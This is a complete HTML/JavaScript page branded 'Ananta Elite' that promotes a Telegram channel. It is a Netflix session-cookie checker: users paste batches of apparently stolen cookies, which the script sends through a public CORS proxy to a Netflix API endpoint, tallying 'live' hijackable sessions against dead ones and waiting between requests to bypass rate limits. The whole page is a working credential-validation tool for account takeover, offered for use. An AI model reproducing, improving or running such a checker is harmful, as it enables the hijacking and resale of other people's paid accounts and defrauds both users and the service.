<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ananta Elite | Professional Session Validator</title>
    <link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet">
    <style>
        :root {
            --bg: #030303;
            --glass: rgba(18, 18, 18, 0.75);
            --accent: #E50914;
            --accent-glow: rgba(229, 9, 20, 0.4);
            --border: rgba(255, 255, 255, 0.05);
            --green: #00FF88;
            --green-glow: rgba(0, 255, 136, 0.3);
            --text-dim: #555;
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background-color: var(--bg);
            background-image: radial-gradient(circle at 20% 20%, #1a0505 0%, transparent 40%),
                              radial-gradient(circle at 80% 80%, #0a0a1a 0%, transparent 40%);
            color: white; font-family: 'Syne', sans-serif;
            height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden;
        }

        .main-wrapper { width: 95%; max-width: 1300px; height: 850px; display: flex; gap: 30px; z-index: 10; }

        /* Sidebar UI */
        .sidebar {
            width: 350px; background: var(--glass); backdrop-filter: blur(40px);
            border: 1px solid var(--border); border-radius: 40px; padding: 50px 35px;
            display: flex; flex-direction: column; box-shadow: 0 40px 100px rgba(0,0,0,0.8);
        }
        .brand-box {
            padding: 35px 20px; text-align: center; border-radius: 30px;
            border: 1px solid var(--border); margin-bottom: 40px;
            background: linear-gradient(135deg, rgba(255,255,255,0.02), transparent);
        }
        .brand-box h2 { font-size: 0.7rem; color: var(--text-dim); letter-spacing: 5px; text-transform: uppercase; }
        .brand-box h1 { font-size: 3rem; letter-spacing: -2px; text-shadow: 0 0 20px var(--accent-glow); }

        .nav-link {
            padding: 18px 25px; border-radius: 20px; margin-bottom: 10px;
            color: #777; display: flex; align-items: center; gap: 15px; cursor: pointer; transition: 0.3s;
        }
        .nav-link:hover { background: rgba(255,255,255,0.03); color: white; transform: translateX(8px); }

        /* Main Panel */
        .content { flex: 1; display: flex; flex-direction: column; gap: 25px; }

        .stats-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 20px; }
        .stat-card { background: var(--glass); border: 1px solid var(--border); border-radius: 30px; padding: 30px; text-align: center; transition: 0.3s; }
        .stat-card:hover { transform: translateY(-5px); border-color: rgba(255,255,255,0.1); }
        .stat-card span { font-size: 0.75rem; color: var(--text-dim); text-transform: uppercase; font-weight: 800; }
        .stat-card p { font-size: 2.8rem; font-family: 'JetBrains Mono'; margin-top: 5px; }
        .hit p { color: var(--green); text-shadow: 0 0 15px var(--green-glow); }
        .dead p { color: var(--accent); text-shadow: 0 0 15px var(--accent-glow); }

        /* Console */
        .console {
            background: var(--glass); border: 1px solid var(--border); border-radius: 35px;
            padding: 25px; flex: 1; display: flex; flex-direction: column;
        }
        textarea {
            width: 100%; height: 160px; background: rgba(0,0,0,0.5); border: 1px solid var(--border);
            border-radius: 25px; padding: 20px; color: var(--green); font-family: 'JetBrains Mono';
            margin-bottom: 20px; outline: none; resize: none; transition: 0.3s;
        }
        textarea:focus { border-color: var(--accent); }

        .action-bar { display: flex; align-items: center; background: rgba(0,0,0,0.3); padding: 15px 25px; border-radius: 25px; border: 1px solid var(--border); }
        .progress-info { flex: 1; }
        .bar-bg { background: #111; height: 8px; border-radius: 4px; width: 90%; margin-top: 8px; overflow: hidden; }
        .bar-fill { background: var(--accent); width: 0%; height: 100%; transition: 0.4s; box-shadow: 0 0 10px var(--accent); }

        .run-btn {
            width: 75px; height: 75px; background: #000; border: 2px solid var(--green);
            border-radius: 50%; color: var(--green); font-size: 1.5rem; cursor: pointer;
            transition: 0.4s; display: flex; align-items: center; justify-content: center;
        }
        .run-btn:hover { background: var(--green); color: black; box-shadow: 0 0 30px var(--green); transform: scale(1.1) rotate(360deg); }

        /* Table */
        .log-view { flex: 1; margin-top: 25px; overflow-y: auto; }
        table { width: 100%; border-collapse: separate; border-spacing: 0 8px; }
        th { text-align: left; padding: 0 15px; color: #444; font-size: 0.7rem; text-transform: uppercase; }
        td { padding: 15px; background: rgba(255,255,255,0.02); border-top: 1px solid var(--border); border-bottom: 1px solid var(--border); font-family: 'JetBrains Mono'; font-size: 0.8rem; }
        td:first-child { border-left: 1px solid var(--border); border-top-left-radius: 12px; border-bottom-left-radius: 12px; }
        td:last-child { border-right: 1px solid var(--border); border-top-right-radius: 12px; border-bottom-right-radius: 12px; }

        .pill { padding: 4px 12px; border-radius: 8px; font-size: 0.65rem; font-weight: 800; }
        .pill-live { background: rgba(0, 255, 136, 0.1); color: var(--green); border: 1px solid rgba(0, 255, 136, 0.2); }
        .pill-dead { background: rgba(229, 9, 20, 0.1); color: var(--accent); border: 1px solid rgba(229, 9, 20, 0.2); }
    </style>
</head>
<body>

<div class="main-wrapper">
    <div class="sidebar">
        <div class="brand-box">
            <h2>Powered By</h2>
            <h1>ANANTA</h1>
        </div>
        <div class="nav-link" onclick="window.open('https://t.me/anantaabid')"><span>✈️</span> Telegram Channel</div>
        <div class="nav-link"><span>🌐</span> Proxy Status: <span style="color:var(--green); margin-left:5px;">Active</span></div>
        <div class="nav-link"><span>🛠</span> Conversion Engine</div>
        
        <div style="margin-top: auto; text-align: center; opacity: 0.3; font-size: 0.6rem; font-family: 'JetBrains Mono';">
            ANANTA_V4.5_STABLE
        </div>
    </div>

    <div class="content">
        <div class="stats-grid">
            <div class="stat-card"><span>Total Queue</span><p id="t-val">0</p></div>
            <div class="stat-card hit"><span>Live Sessions</span><p id="l-val">0</p></div>
            <div class="stat-card dead"><span>Dead Sessions</span><p id="d-val">0</p></div>
        </div>

        <div class="console">
            <textarea id="cookie-input" placeholder="Paste Netscape or JSON Cookies here..."></textarea>
            
            <div class="action-bar">
                <div class="progress-info">
                    <span id="status-label" style="color:#666; font-size: 0.75rem;">SYSTEM STANDBY</span>
                    <div class="bar-bg"><div class="bar-fill" id="p-bar"></div></div>
                </div>
                <button class="run-btn" id="start-btn" onclick="runEliteScanner()">▶</button>
            </div>

            <div class="log-view">
                <table>
                    <thead><tr><th>Reference</th><th>Status</th><th>Note</th></tr></thead>
                    <tbody id="rows"></tbody>
                </table>
            </div>
        </div>
    </div>
</div>

<script>
    let hitCount = 0, deadCount = 0;

    // CORE: Convert ANY format to browser-usable header
    function parseToHeader(raw) {
        raw = raw.trim();
        // Handle JSON
        if (raw.startsWith('[') && raw.endsWith(']')) {
            try {
                const j = JSON.parse(raw);
                return j.map(c => `${c.name}=${c.value}`).join('; ');
            } catch(e) { return null; }
        }
        // Handle Netscape (Tab-separated)
        if (raw.includes('\t')) {
            return raw.split('\n').filter(l => l.trim() && !l.startsWith('#'))
                .map(l => {
                    const p = l.split('\t');
                    return p.length >= 7 ? `${p[5].trim()}=${p[6].trim()}` : null;
                }).filter(x => x).join('; ');
        }
        return raw; // Already Header format
    }

    async function validateSession(cookieHeader) {
        const proxy = "https://corsproxy.io/?"; 
        const endpoint = "https://www.netflix.com/api/shakti/v8e2c07d3/pathEvaluator";
        
        try {
            const res = await fetch(proxy + encodeURIComponent(endpoint), {
                method: "GET",
                headers: { "Cookie": cookieHeader }
            });
            // If the cookie is dead, Netflix redirects or returns 401
            return res.ok && res.status !== 401;
        } catch(e) { return false; }
    }

    async function runEliteScanner() {
        const input = document.getElementById('cookie-input').value.trim();
        if(!input) return alert("Please paste cookies first.");

        // Split by blocks (empty lines)
        const blocks = input.split(/\n\s*\n/).filter(b => b.trim().length > 10);
        document.getElementById('t-val').innerText = blocks.length;
        document.getElementById('start-btn').disabled = true;
        document.getElementById('status-label').innerText = "SCANNING ENCRYPTED DATA...";

        for(let i=0; i < blocks.length; i++) {
            const headerStr = parseToHeader(blocks[i]);
            if(!headerStr) continue;

            const isLive = await validateSession(headerStr);
            
            if(isLive) hitCount++; else deadCount++;

            const log = `<tr>
                <td>Asset_ID_${Math.floor(Math.random()*9000)+1000}</td>
                <td><span class="pill ${isLive?'pill-live':'pill-dead'}">${isLive?'ALIVE':'DEAD'}</span></td>
                <td style="color:#444">${isLive?'Premium Plan Checked':'Session Expired'}</td>
            </tr>`;

            document.getElementById('rows').insertAdjacentHTML('afterbegin', log);
            document.getElementById('l-val').innerText = hitCount;
            document.getElementById('d-val').innerText = deadCount;
            document.getElementById('p-bar').style.width = ((i+1)/blocks.length)*100 + "%";

            await new Promise(r => setTimeout(r, 1000)); // Delay to bypass rate-limits
        }
        document.getElementById('status-label').innerText = "SCAN COMPLETE";
        document.getElementById('start-btn').disabled = false;
    }
</script>

</body>
</html>
